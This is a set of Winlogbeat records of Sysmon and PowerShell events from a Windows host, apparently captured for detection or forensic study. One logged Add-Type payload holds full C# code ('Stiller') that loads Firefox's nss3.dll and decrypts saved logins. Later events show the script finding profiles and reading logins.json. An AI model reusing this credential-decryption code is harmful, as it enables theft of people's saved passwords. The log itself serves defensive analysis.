    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "12",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "344749",
                    "Execution": {
                        "@ProcessID": "2616",
                        "@ThreadID": "4664"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "12",
                    "Version": "2"
                },
                "event_data": {
                    "EventType": "CreateKey",
                    "Image": "C:\\WINDOWS\\Explorer.EXE",
                    "ProcessGuid": "{b9db5ea0-6d86-5ed1-0000-0010ae842900}",
                    "ProcessId": "8544",
                    "RuleName": "None",
                    "TargetObject": "HKU\\S-1-5-21-4233494930-2381004282-3948590939-500\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.sldm",
                    "UtcTime": "2020-05-29 20:23:22.858"
                },
                "time_created": "2020-05-29T20:23:22.875954"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "12",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "344750",
                    "Execution": {
                        "@ProcessID": "2616",
                        "@ThreadID": "4664"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "12",
                    "Version": "2"
                },
                "event_data": {
                    "EventType": "CreateKey",
                    "Image": "C:\\WINDOWS\\Explorer.EXE",
                    "ProcessGuid": "{b9db5ea0-6d86-5ed1-0000-0010ae842900}",
                    "ProcessId": "8544",
                    "RuleName": "None",
                    "TargetObject": "HKU\\S-1-5-21-4233494930-2381004282-3948590939-500\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.sldx",
                    "UtcTime": "2020-05-29 20:23:22.858"
                },
                "time_created": "2020-05-29T20:23:22.877195"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-PowerShell/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "{4811673b-35f3-0001-e0cd-1148f335d601}",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "4103",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "3724265",
                    "Execution": {
                        "@ProcessID": "6076",
                        "@ThreadID": "10736"
                    },
                    "Keywords": "0x0000000000000000",
                    "Level": "4",
                    "Opcode": "20",
                    "Provider": {
                        "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                        "@Name": "Microsoft-Windows-PowerShell"
                    },
                    "Security": {
                        "@UserID": "S-1-5-21-4233494930-2381004282-3948590939-1001"
                    },
                    "Task": "106",
                    "Version": "1"
                },
                "event_data": {
                    "ContextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.752\n        Host ID = ec1f9bd3-9cb9-407b-b281-94864946226a\n        Host Application = powershell\n        Engine Version = 5.1.18362.752\n        Runspace ID = db7beb30-ad42-4fe8-ad7a-b2a5524f5bb4\n        Pipeline ID = 1392\n        Command Name = Add-Type\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 34\n        User = PC-NIUBBO\\Niubbo\n        Connected User = \n        Shell ID = Microsoft.PowerShell",
                    "Payload": "CommandInvocation(Add-Type): \"Add-Type\"\nParameterBinding(Add-Type): name=\"TypeDefinition\"; value=\"public struct TSECItem2 {\npublic int SECItemType;\npublic int SECItemData;\npublic int SECItemLen;\n}\n\npublic struct SlotInfo {\n}\"\nParameterBinding(Add-Type): name=\"Language\"; value=\"CSharp\"\nParameterBinding(Add-Type): name=\"CompilerParameters\"; value=\"System.CodeDom.Compiler.CompilerParameters\"",
                    "UserData": "None"
                },
                "time_created": "2020-05-29T20:23:25.591650"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-PowerShell/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "{4811673b-35f3-0000-73d0-1148f335d601}",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "4103",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "3724266",
                    "Execution": {
                        "@ProcessID": "6076",
                        "@ThreadID": "10736"
                    },
                    "Keywords": "0x0000000000000000",
                    "Level": "4",
                    "Opcode": "20",
                    "Provider": {
                        "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                        "@Name": "Microsoft-Windows-PowerShell"
                    },
                    "Security": {
                        "@UserID": "S-1-5-21-4233494930-2381004282-3948590939-1001"
                    },
                    "Task": "106",
                    "Version": "1"
                },
                "event_data": {
                    "ContextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.752\n        Host ID = ec1f9bd3-9cb9-407b-b281-94864946226a\n        Host Application = powershell\n        Engine Version = 5.1.18362.752\n        Runspace ID = db7beb30-ad42-4fe8-ad7a-b2a5524f5bb4\n        Pipeline ID = 1392\n        Command Name = Add-Type\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 36\n        User = PC-NIUBBO\\Niubbo\n        Connected User = \n        Shell ID = Microsoft.PowerShell",
                    "Payload": "CommandInvocation(Add-Type): \"Add-Type\"\nParameterBinding(Add-Type): name=\"TypeDefinition\"; value=\"    using System;\n    using System.Diagnostics;\n    using System.Runtime.InteropServices;\n    using System.Text;\n\n\npublic static class nss3\n{\n[DllImport(\"nss3.dll\", EntryPoint = \"PL_Base64Decode\", CallingConvention = CallingConvention.StdCall,  CharSet = CharSet.Auto)]\npublic static extern IntPtr PL_Base64Decode(IntPtr inStr, int inLen, IntPtr outStr);\n\n[DllImport(\"nss3.dll\", CharSet=CharSet.Auto)]\npublic static extern IntPtr PK11_GetInternalKeySlot();\n\n[DllImport(\"nss3.dll\", CharSet=CharSet.Auto)]\npublic static extern void PK11_FreeSlot(IntPtr SlotInfoPtr);\n\n[DllImport(\"nss3.dll\", CharSet=CharSet.Auto)]\npublic static extern int PK11_CheckUserPassword(IntPtr slotInfo, string pwd);\n\n\n[DllImport(\"nss3.dll\", EntryPoint = \"PK11SDR_Decrypt\", CallingConvention = CallingConvention.Cdecl,  CharSet = CharSet.Ansi)]\npublic static extern int  PK11SDR_Decrypt(IntPtr dataIn, IntPtr dataOut, string pVoid);\n\n[DllImport(\"nss3.dll\", EntryPoint = \"SECITEM_ZfreeItem\", CallingConvention = CallingConvention.Cdecl,  CharSet = CharSet.Ansi)]\npublic static extern void  SECITEM_ZfreeItem(IntPtr secItem, int count);\n\n[DllImport(\"nss3.dll\", EntryPoint = \"NSSUTIL_GetVersion\", CallingConvention = CallingConvention.StdCall,  CharSet = CharSet.Auto)]\npublic static extern IntPtr NSSUTIL_GetVersion();\n\n[DllImport(\"nss3.dll\", EntryPoint = \"NSS_IsInitialized\", CallingConvention = CallingConvention.StdCall,  CharSet = CharSet.Auto)]\npublic static extern bool NSS_IsInitialized();\n\n[DllImport(\"nss3.dll\", EntryPoint = \"NSS_Init\", CallingConvention = CallingConvention.StdCall,  CharSet = CharSet.Auto)]\npublic static extern int NSS_Init(byte[] path);\n\n[DllImport(\"nss3.dll\", EntryPoint = \"NSS_Shutdown\", CallingConvention = CallingConvention.StdCall,  CharSet = CharSet.Auto)]\npublic static extern int NSS_Shutdown();\n\n\n[DllImport(\"nss3.dll\", CharSet=CharSet.Auto)]\npublic static extern int PORT_GetError();\n\n[DllImport(\"nss3.dll\", CharSet=CharSet.Auto)]\npublic static extern IntPtr PR_ErrorToName(int err);\n}\n\n\ninternal static class UnsafeNativeMethods\n{\n[DllImport(\"kernel32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\ninternal static extern IntPtr LoadLibrary(string lpFileName);\n    \n[DllImport(\"kernel32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\ninternal static extern bool FreeLibrary(IntPtr hModule);\n    \n    \n\n[DllImport(\"kernel32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\ninternal static extern bool SetDllDirectoryW(string lpPathName);\n\n[DllImport(\"kernel32.dll\", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]\ninternal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n}\n\n\npublic static class Stiller\n{\n\nstatic IntPtr pk11slot = IntPtr.Zero;\n\nstatic IntPtr vcruntime140dll = IntPtr.Zero;\nstatic IntPtr msvcp140dll = IntPtr.Zero;\nstatic IntPtr mozgluedll = IntPtr.Zero;\n\nstatic IntPtr nss3dll = IntPtr.Zero;\n\n\npublic static void loadHelpers(string ffPath)\n{\nStiller.vcruntime140dll = UnsafeNativeMethods.LoadLibrary(ffPath + \"\\\\vcruntime140.dll\");\nStiller.msvcp140dll = UnsafeNativeMethods.LoadLibrary(ffPath + \"\\\\msvcp140.dll\");\nStiller.mozgluedll = UnsafeNativeMethods.LoadLibrary(ffPath + \"\\\\mozglue.dll\"); \n}\n\npublic static IntPtr loadNSS3(string ffPath)\n{\nIntPtr nss3 = UnsafeNativeMethods.LoadLibrary(ffPath + \"\\\\nss3.dll\"); \n\nStiller.nss3dll = nss3;\n\nreturn nss3;    \n}\n  \n  \npublic static bool initFF(string ffPath, string profilePath)\n{\nbool result = false;\n  \n  \nloadHelpers(ffPath);\n\nif(loadNSS3(ffPath) != IntPtr.Zero)\n{\nIntPtr nV = nss3.NSSUTIL_GetVersion();\nint nssInitRez = nss3.NSS_Init(Encoding.ASCII.GetBytes(profilePath));\n\nif(nssInitRez == 0)\n{\npk11slot = nss3.PK11_GetInternalKeySlot();\n\nint checkPwd = nss3.PK11_CheckUserPassword(pk11slot, \"\");\n\n\nif(checkPwd == 0)\n{\nresult = true;\n}\n}\n}\n\n\nreturn result;\n}\n\npublic static void shutdownFF()\n{\nnss3.PK11_FreeSlot(pk11slot);\n\nint rez = nss3.NSS_Shutdown();\n\nUnsafeNativeMethods.FreeLibrary(nss3dll); \nUnsafeNativeMethods.FreeLibrary(Stiller.mozgluedll); \nUnsafeNativeMethods.FreeLibrary(Stiller.msvcp140dll);\nUnsafeNativeMethods.FreeLibrary(Stiller.vcruntime140dll);\n}\n  \npublic struct TSECItemType {\npublic int SECItemType;\npublic IntPtr SECItemData;\npublic int SECItemLen;\n}\n  \npublic struct SlotInfo {\npublic long l;\n}  \n  \npublic static string decodeData(string profilePath, string dataEnc, byte[] unBase64)\n{\n\nstring decoded = \"\";\n\ntry\n{\n\nbool nssIsInit = nss3.NSS_IsInitialized();\n\nif(!nssIsInit)\n{\n\nreturn \"\";\n}\n\n\nint TSECItemTypeSize = Marshal.SizeOf(typeof(TSECItemType));\nTSECItemType dataIn = new TSECItemType();\n\n\ndataIn.SECItemData = Marshal.AllocHGlobal(unBase64.Length);\nMarshal.Copy(unBase64, 0, dataIn.SECItemData, unBase64.Length);\n\ndataIn.SECItemLen= unBase64.Length;\ndataIn.SECItemType= 0;\n\n\nIntPtr dataOutPtr = Marshal.AllocHGlobal(TSECItemTypeSize);\nIntPtr dataInPtr = Marshal.AllocHGlobal(TSECItemTypeSize);\n\nMarshal.StructureToPtr(dataIn, dataInPtr, true);\n\nint decryptRez = nss3.PK11SDR_Decrypt(dataInPtr, dataOutPtr, null);\n\nif(decryptRez != 0)\n{\n\nreturn \"\";\n}\n\nTSECItemType dataOut = (Stiller.TSECItemType)Marshal.PtrToStructure(dataOutPtr, typeof(TSECItemType));//\n\ndecoded = PtrToStringSized(dataOut.SECItemData, dataOut.SECItemLen);\n\nnss3.SECITEM_ZfreeItem(dataOutPtr, 0);\nMarshal.FreeHGlobal(dataInPtr);\n}\ncatch\n{  \nreturn \"\";\n}  \n\n\nreturn decoded;\n}\n \nprivate static string PtrToStringUtf8(IntPtr ptr) // aPtr is nul-terminated\n{\nif (ptr == IntPtr.Zero)\nreturn \"\";\n    \nint len = 0;\n\nwhile (System.Runtime.InteropServices.Marshal.ReadByte(ptr, len) != 0)\nlen++;\n        \nif (len == 0)\nreturn \"\";\n\nbyte[] array = new byte[len];\n\nSystem.Runtime.InteropServices.Marshal.Copy(ptr, array, 0, len);\n    \n\nreturn System.Text.Encoding.UTF8.GetString(array);\n} \n\nprivate static string PtrToStringSized(IntPtr ptr, int len) // aPtr is nul-terminated\n{\nif (ptr == IntPtr.Zero)\nreturn \"\";  \n\nif (len == 0)\nreturn \"\";\n        \nbyte[] array = new byte[len];\n\nSystem.Runtime.InteropServices.Marshal.Copy(ptr, array, 0, len);\n\n\nreturn System.Text.Encoding.UTF8.GetString(array);\n} \n}\n\n\"\nParameterBinding(Add-Type): name=\"Language\"; value=\"CSharp\"",
                    "UserData": "None"
                },
                "time_created": "2020-05-29T20:23:25.748644"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-PowerShell/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "{4811673b-35f3-0000-76d0-1148f335d601}",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "4103",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "3724267",
                    "Execution": {
                        "@ProcessID": "6076",
                        "@ThreadID": "10736"
                    },
                    "Keywords": "0x0000000000000000",
                    "Level": "4",
                    "Opcode": "20",
                    "Provider": {
                        "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                        "@Name": "Microsoft-Windows-PowerShell"
                    },
                    "Security": {
                        "@UserID": "S-1-5-21-4233494930-2381004282-3948590939-1001"
                    },
                    "Task": "106",
                    "Version": "1"
                },
                "event_data": {
                    "ContextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.752\n        Host ID = ec1f9bd3-9cb9-407b-b281-94864946226a\n        Host Application = powershell\n        Engine Version = 5.1.18362.752\n        Runspace ID = db7beb30-ad42-4fe8-ad7a-b2a5524f5bb4\n        Pipeline ID = 1392\n        Command Name = Get-ChildItem\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 38\n        User = PC-NIUBBO\\Niubbo\n        Connected User = \n        Shell ID = Microsoft.PowerShell",
                    "Payload": "CommandInvocation(Get-ChildItem): \"Get-ChildItem\"\nParameterBinding(Get-ChildItem): name=\"ErrorAction\"; value=\"SilentlyContinue\"\nParameterBinding(Get-ChildItem): name=\"Path\"; value=\"C:\\Users\\Niubbo\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.*\"",
                    "UserData": "None"
                },
                "time_created": "2020-05-29T20:23:25.826197"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-PowerShell/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "{4811673b-35f3-0000-77d0-1148f335d601}",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "4103",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "3724268",
                    "Execution": {
                        "@ProcessID": "6076",
                        "@ThreadID": "10736"
                    },
                    "Keywords": "0x0000000000000000",
                    "Level": "4",
                    "Opcode": "20",
                    "Provider": {
                        "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                        "@Name": "Microsoft-Windows-PowerShell"
                    },
                    "Security": {
                        "@UserID": "S-1-5-21-4233494930-2381004282-3948590939-1001"
                    },
                    "Task": "106",
                    "Version": "1"
                },
                "event_data": {
                    "ContextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.752\n        Host ID = ec1f9bd3-9cb9-407b-b281-94864946226a\n        Host Application = powershell\n        Engine Version = 5.1.18362.752\n        Runspace ID = db7beb30-ad42-4fe8-ad7a-b2a5524f5bb4\n        Pipeline ID = 1392\n        Command Name = Select-Object\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 40\n        User = PC-NIUBBO\\Niubbo\n        Connected User = \n        Shell ID = Microsoft.PowerShell",
                    "Payload": "CommandInvocation(Select-Object): \"Select-Object\"\nParameterBinding(Select-Object): name=\"ExpandProperty\"; value=\"FullName\"\nParameterBinding(Select-Object): name=\"ErrorAction\"; value=\"SilentlyContinue\"\nParameterBinding(Select-Object): name=\"InputObject\"; value=\"C:\\Users\\Niubbo\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\r9o4iq99.default\"",
                    "UserData": "None"
                },
                "time_created": "2020-05-29T20:23:26.181671"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-PowerShell/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "{4811673b-35f3-0000-79d0-1148f335d601}",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "4103",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "3724269",
                    "Execution": {
                        "@ProcessID": "6076",
                        "@ThreadID": "10736"
                    },
                    "Keywords": "0x0000000000000000",
                    "Level": "4",
                    "Opcode": "20",
                    "Provider": {
                        "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                        "@Name": "Microsoft-Windows-PowerShell"
                    },
                    "Security": {
                        "@UserID": "S-1-5-21-4233494930-2381004282-3948590939-1001"
                    },
                    "Task": "106",
                    "Version": "1"
                },
                "event_data": {
                    "ContextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.752\n        Host ID = ec1f9bd3-9cb9-407b-b281-94864946226a\n        Host Application = powershell\n        Engine Version = 5.1.18362.752\n        Runspace ID = db7beb30-ad42-4fe8-ad7a-b2a5524f5bb4\n        Pipeline ID = 1392\n        Command Name = Get-ChildItem\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 42\n        User = PC-NIUBBO\\Niubbo\n        Connected User = \n        Shell ID = Microsoft.PowerShell",
                    "Payload": "CommandInvocation(Get-ChildItem): \"Get-ChildItem\"\nParameterBinding(Get-ChildItem): name=\"ErrorAction\"; value=\"SilentlyContinue\"\nParameterBinding(Get-ChildItem): name=\"Path\"; value=\"C:\\Users\\Niubbo\\AppData\\Roaming\\ThunderBird\\Profiles\\*.*\"\nNonTerminatingError(Get-ChildItem): \"Cannot find path 'C:\\Users\\Niubbo\\AppData\\Roaming\\ThunderBird\\Profiles' because it does not exist.\"",
                    "UserData": "None"
                },
                "time_created": "2020-05-29T20:23:26.187252"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-PowerShell/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "{4811673b-35f3-0000-7bd0-1148f335d601}",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "4103",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "3724270",
                    "Execution": {
                        "@ProcessID": "6076",
                        "@ThreadID": "10736"
                    },
                    "Keywords": "0x0000000000000000",
                    "Level": "4",
                    "Opcode": "20",
                    "Provider": {
                        "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                        "@Name": "Microsoft-Windows-PowerShell"
                    },
                    "Security": {
                        "@UserID": "S-1-5-21-4233494930-2381004282-3948590939-1001"
                    },
                    "Task": "106",
                    "Version": "1"
                },
                "event_data": {
                    "ContextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.752\n        Host ID = ec1f9bd3-9cb9-407b-b281-94864946226a\n        Host Application = powershell\n        Engine Version = 5.1.18362.752\n        Runspace ID = db7beb30-ad42-4fe8-ad7a-b2a5524f5bb4\n        Pipeline ID = 1392\n        Command Name = Out-Null\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 44\n        User = PC-NIUBBO\\Niubbo\n        Connected User = \n        Shell ID = Microsoft.PowerShell",
                    "Payload": "CommandInvocation(Out-Null): \"Out-Null\"\nCommandInvocation(Select-Object): \"Select-Object\"\nParameterBinding(Select-Object): name=\"ExpandProperty\"; value=\"FullName\"\nParameterBinding(Select-Object): name=\"ErrorAction\"; value=\"SilentlyContinue\"",
                    "UserData": "None"
                },
                "time_created": "2020-05-29T20:23:26.188816"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-PowerShell/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "{4811673b-35f3-0000-7cd0-1148f335d601}",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "4103",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "3724271",
                    "Execution": {
                        "@ProcessID": "6076",
                        "@ThreadID": "10736"
                    },
                    "Keywords": "0x0000000000000000",
                    "Level": "4",
                    "Opcode": "20",
                    "Provider": {
                        "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                        "@Name": "Microsoft-Windows-PowerShell"
                    },
                    "Security": {
                        "@UserID": "S-1-5-21-4233494930-2381004282-3948590939-1001"
                    },
                    "Task": "106",
                    "Version": "1"
                },
                "event_data": {
                    "ContextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.752\n        Host ID = ec1f9bd3-9cb9-407b-b281-94864946226a\n        Host Application = powershell\n        Engine Version = 5.1.18362.752\n        Runspace ID = db7beb30-ad42-4fe8-ad7a-b2a5524f5bb4\n        Pipeline ID = 1392\n        Command Name = Join-Path\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 46\n        User = PC-NIUBBO\\Niubbo\n        Connected User = \n        Shell ID = Microsoft.PowerShell",
                    "Payload": "CommandInvocation(Join-Path): \"Join-Path\"\nParameterBinding(Join-Path): name=\"Path\"; value=\"C:\\Program Files\\Mozilla Firefox\"\nParameterBinding(Join-Path): name=\"ChildPath\"; value=\"nss3.dll\"",
                    "UserData": "None"
                },
                "time_created": "2020-05-29T20:23:26.192329"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-PowerShell/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "{4811673b-35f3-0000-7dd0-1148f335d601}",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "4103",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "3724272",
                    "Execution": {
                        "@ProcessID": "6076",
                        "@ThreadID": "10736"
                    },
                    "Keywords": "0x0000000000000000",
                    "Level": "4",
                    "Opcode": "20",
                    "Provider": {
                        "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                        "@Name": "Microsoft-Windows-PowerShell"
                    },
                    "Security": {
                        "@UserID": "S-1-5-21-4233494930-2381004282-3948590939-1001"
                    },
                    "Task": "106",
                    "Version": "1"
                },
                "event_data": {
                    "ContextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.752\n        Host ID = ec1f9bd3-9cb9-407b-b281-94864946226a\n        Host Application = powershell\n        Engine Version = 5.1.18362.752\n        Runspace ID = db7beb30-ad42-4fe8-ad7a-b2a5524f5bb4\n        Pipeline ID = 1392\n        Command Name = Join-Path\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 48\n        User = PC-NIUBBO\\Niubbo\n        Connected User = \n        Shell ID = Microsoft.PowerShell",
                    "Payload": "CommandInvocation(Join-Path): \"Join-Path\"\nParameterBinding(Join-Path): name=\"Path\"; value=\"C:\\Users\\Niubbo\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\r9o4iq99.default\"\nParameterBinding(Join-Path): name=\"ChildPath\"; value=\"logins.json\"",
                    "UserData": "None"
                },
                "time_created": "2020-05-29T20:23:26.195995"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-PowerShell/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "{4811673b-35f3-0000-7ed0-1148f335d601}",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "4103",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "3724273",
                    "Execution": {
                        "@ProcessID": "6076",
                        "@ThreadID": "10736"
                    },
                    "Keywords": "0x0000000000000000",
                    "Level": "4",
                    "Opcode": "20",
                    "Provider": {
                        "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                        "@Name": "Microsoft-Windows-PowerShell"
                    },
                    "Security": {
                        "@UserID": "S-1-5-21-4233494930-2381004282-3948590939-1001"
                    },
                    "Task": "106",
                    "Version": "1"
                },
                "event_data": {
                    "ContextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.752\n        Host ID = ec1f9bd3-9cb9-407b-b281-94864946226a\n        Host Application = powershell\n        Engine Version = 5.1.18362.752\n        Runspace ID = db7beb30-ad42-4fe8-ad7a-b2a5524f5bb4\n        Pipeline ID = 1392\n        Command Name = Get-Content\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 50\n        User = PC-NIUBBO\\Niubbo\n        Connected User = \n        Shell ID = Microsoft.PowerShell",
                    "Payload": "CommandInvocation(Get-Content): \"Get-Content\"\nParameterBinding(Get-Content): name=\"ErrorAction\"; value=\"SilentlyContinue\"\nParameterBinding(Get-Content): name=\"Path\"; value=\"C:\\Users\\Niubbo\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\r9o4iq99.default\\logins.json\"",
                    "UserData": "None"
                },
                "time_created": "2020-05-29T20:23:26.378658"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-PowerShell/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "{4811673b-35f3-0000-81d0-1148f335d601}",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "4103",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "3724274",
                    "Execution": {
                        "@ProcessID": "6076",
                        "@ThreadID": "10736"
                    },
                    "Keywords": "0x0000000000000000",
                    "Level": "4",
                    "Opcode": "20",
                    "Provider": {
                        "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                        "@Name": "Microsoft-Windows-PowerShell"
                    },
                    "Security": {
                        "@UserID": "S-1-5-21-4233494930-2381004282-3948590939-1001"
                    },
                    "Task": "106",
                    "Version": "1"
                },
                "event_data": {
                    "ContextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.752\n        Host ID = ec1f9bd3-9cb9-407b-b281-94864946226a\n        Host Application = powershell\n        Engine Version = 5.1.18362.752\n        Runspace ID = db7beb30-ad42-4fe8-ad7a-b2a5524f5bb4\n        Pipeline ID = 1392\n        Command Name = New-Object\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 52\n        User = PC-NIUBBO\\Niubbo\n        Connected User = \n        Shell ID = Microsoft.PowerShell",
                    "Payload": "CommandInvocation(New-Object): \"New-Object\"\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Web.Script.Serialization.JavaScriptSerializer\"",
